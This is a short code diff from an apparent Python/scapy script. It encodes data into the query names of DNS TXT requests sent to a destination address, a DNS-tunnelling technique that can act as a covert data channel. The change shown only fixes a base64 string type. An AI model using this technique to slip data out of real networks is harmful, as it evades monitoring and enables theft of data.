@@ -32,7 +32,7 @@ def send_qery(dest_adr,data,is_output):
     for chunk in range(0, len(data), MTU_SIZE - HEADER_SIZE):
         x = chunk
         if is_output == 1:                          # if in_transfer flag is required
-            content = base64.b64encode(IN_TRANSFER)
+            content = base64.b64encode(IN_TRANSFER).decode('ascii')
             content+=data[x:x+1400]
             pkt = IP(dst=dest_adr)/UDP(sport="1234")/DNS(qd=DNSQR(qtype="TXT", qname=content))
         else:
